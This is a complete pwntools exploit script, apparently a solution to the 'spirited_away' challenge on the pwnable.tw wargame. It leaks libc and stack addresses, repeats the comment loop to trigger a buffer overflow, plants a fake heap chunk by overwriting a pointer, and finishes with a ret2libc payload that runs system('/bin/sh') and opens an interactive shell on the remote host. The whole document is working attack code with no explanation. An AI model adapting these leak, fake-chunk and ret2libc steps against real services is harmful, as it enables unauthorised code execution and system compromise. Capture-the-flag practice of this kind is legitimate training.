from pwn import *

#s = process("/root/spirited_away")
s = remote("chall.pwnable.tw",10204)

print "[+] Leak libc"
s.recvuntil("name: ")
s.sendline("1234")
s.recv(1024)
s.sendline("1234")
s.recv(1024)
s.send('a'*0x28)
s.recv(1024)
s.sendline("1234")
s.recvuntil('a'*0x28)
libc_leak = u32(s.recvn(4))
libc_base = libc_leak - 0x001B0D60
libc_system = libc_base + 0x0003A940
libc_binsh = libc_base + 0x158E8B
print "[>] libc_base : "+hex(libc_base)

s.recvuntil("<y/n>: ")
s.sendline("y")

print "[+] Leak stack"
s.recv(1024)
s.sendline("1234")
s.recv(1024)
s.sendline("1234")
s.recv(1024)
s.send('a'*0x50)
s.recv(1024)
s.sendline("1234")
s.recvuntil('a'*0x50)
stack_leak = u32(s.recvn(4))
stack_reason = stack_leak - 0x70
print "[>] stack_leak : "+hex(stack_leak)

s.recvuntil("<y/n>: ")
s.sendline("y")

print "[+] Prepare Stack Overflow \n[>]",
for i in range(98):
	s.recv(1024)
	s.sendline("1")
	s.recv(1024)
	s.send("1\n")
	s.recv(1024)
	s.send("1")
	s.recv(1024)
	s.send("1")
	s.recvuntil("<y/n>: ")
	s.sendline("y")
	if i%10==0:
		print i,
print "[>] End"

print "[+] Overwrtie ptr_name and make fake chunk"
s.recv(1024)
s.send("1")
s.recv(1024)
s.send("1\n")
s.recv(1024)
payload = "aaaa"+p32(0x40) + "\x00"*(0x40-4) + p32(0x81)     # next malloc == ptr_reason + 0x44
s.send(payload)
s.recv(1024)
s.send("a"*0x54+p32(stack_reason+8))
print "[>] End"

s.recvuntil("<y/n>: ")
s.sendline("y")

print "[+] Overflow stack"
s.recv(1024)
payload = 'a'*0x4c + p32(libc_system)*2 + p32(libc_binsh)
s.send(payload)
s.recv(1024)
s.send("1\n")
s.recv(1024)
s.send("1")
s.recv(1024)
s.send("1")
s.recvuntil("<y/n>: ")
s.sendline("n")
s.interactive()